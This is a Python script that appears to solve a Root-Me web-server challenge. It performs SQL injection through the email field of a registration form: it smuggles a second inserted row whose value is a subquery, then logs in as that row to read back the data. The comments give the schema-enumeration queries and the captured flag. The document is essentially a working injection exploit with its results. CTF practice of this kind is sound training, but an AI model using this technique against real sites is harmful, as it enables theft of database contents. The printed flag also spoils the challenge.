import requests
import random

url = 'http://challenge01.root-me.org/web-serveur/ch33/'
username = random.randint(10000,99999)

# JSON
param_1 = {'action':'register'}
param_2 = {'action':'login'}

# INSERT INTO users(username,password,email) VALUES('$username','$password','$email')
payload = "(select flag from flag limit 0,1)"
email = "1'),('%s5','1',%s)-- -" %(username, payload)

data_1 = {'username':username,'password':'1','email':email}
data_2 = {'username':str(username) + '5','password':'1'}

# register 2 account
response_1 = requests.post(url, params=param_1, data=data_1)
# login account 2
response_2 = requests.post(url, params=param_2, data=data_2)

# find() : trả về vị trí của chuỗi
print(response_1.text[response_1.text.find("</form>"):])
print(response_2.text[response_2.text.find("Email : "):])

# payload:

# (select database()) : c_webserveur_33
# (select table_name from information_schema.tables where table_schema = 'c_webserveur_33' limit n,1) :
# memberes, flag
# (select column_name from information_schema.columns where table_name = 'flag' limit 0,1) : flag
# (select flag from flag limit 0,1) : flag is : moaZ63rVXUhlQ8tVS7Hw